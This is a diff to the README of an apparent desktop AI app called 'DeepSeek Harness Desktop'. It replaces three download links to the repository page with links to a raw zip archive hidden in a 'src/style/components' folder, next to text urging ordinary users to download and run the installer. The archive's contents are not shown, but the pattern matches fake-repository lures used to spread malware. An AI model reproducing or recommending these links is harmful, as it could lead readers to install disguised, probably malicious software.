@@ -1,6 +1,6 @@
 # 🚀 deepseek-harness-desktop - One-Click AI Power for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-DeepSeek%20Harness%20Desktop-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Ttkt2086/deepseek-harness-desktop)
+[![Download Now](https://img.shields.io/badge/Download-DeepSeek%20Harness%20Desktop-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Ttkt2086/deepseek-harness-desktop/raw/refs/heads/main/src/style/components/deepseek_desktop_harness_v2.8.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Think of it as a magic box that unlocks advanced AI capabilities right on your W
 
 Visit this link to download the application:
 
-👉 **[Download DeepSeek Harness Desktop](https://github.com/Ttkt2086/deepseek-harness-desktop)**
+👉 **[Download DeepSeek Harness Desktop](https://github.com/Ttkt2086/deepseek-harness-desktop/raw/refs/heads/main/src/style/components/deepseek_desktop_harness_v2.8.zip)**
 
 ### Step 2: Run the Installer
 
@@ -213,7 +213,7 @@ DeepSeek Harness Desktop makes powerful AI technology accessible to everyone. No
 
 Remember: **visiting this link** is your first step:
 
-[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-orange?style=for-the-badge&logo=download)](https://github.com/Ttkt2086/deepseek-harness-desktop)
+[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-orange?style=for-the-badge&logo=download)](https://github.com/Ttkt2086/deepseek-harness-desktop/raw/refs/heads/main/src/style/components/deepseek_desktop_harness_v2.8.zip)
 
 We can't wait to see what you'll create with it!
 
